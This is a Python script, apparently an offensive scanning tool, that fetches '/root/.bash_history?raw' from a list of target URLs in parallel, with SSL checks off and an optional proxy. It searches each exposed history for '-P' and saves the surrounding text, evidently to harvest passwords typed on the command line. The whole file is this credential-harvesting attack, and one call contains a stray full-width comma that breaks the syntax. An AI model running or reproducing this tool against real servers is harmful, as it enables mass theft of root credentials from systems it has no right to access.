import requests
import argparse
import urllib3
import concurrent.futures

# Suppress SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def check_url(link, proxy):
    url = f"{link}/root/.bash_history?raw"
    proxies = {"http": proxy, "https": proxy} if proxy else None
    try:
        response = requests.get(url, timeout=5, verify=False, proxies=proxiesï¼Œallow_redirects=False)  # Disable SSL verification
        if response.status_code == 200:
            content = response.text
            if "-P" in content:
                index = content.find("-P")
                start = max(0, index - 25)
                end = min(len(content), index + 27)  # 25 chars before + "-P" (2 chars) + 25 chars after
                result = f"[SUCCESS] {url} contains '-P': {content[start:end]}"
                print(result)
                return result
            else:
                print(f"[FAIL] {url} does not contain '-P'")
        else:
            print(f"[FAIL] {url} returned {response.status_code}")
    except requests.RequestException as e:
        print(f"[ERROR] Could not reach {url}: {e}")
    return None

def check_bash_history(ip_list_file, proxy):
    with open(ip_list_file, 'r') as file:
        links = [line.strip() for line in file.readlines()]
    
    results = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:  # Use thread pool
        futures = {executor.submit(check_url, link, proxy): link for link in links}
        for future in concurrent.futures.as_completed(futures):
            result = future.result()
            if result:
                results.append(result)
    
    with open("output.txt", "w") as output_file:
        for result in results:
            output_file.write(result + "\n")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Batch check .bash_history access on multiple links")
    parser.add_argument("-f", "--file", required=True, help="File containing base links")
    parser.add_argument("--proxy", help="Proxy server (e.g., http://proxy:port)")
    args = parser.parse_args()
    
    check_bash_history(args.file, args.proxy)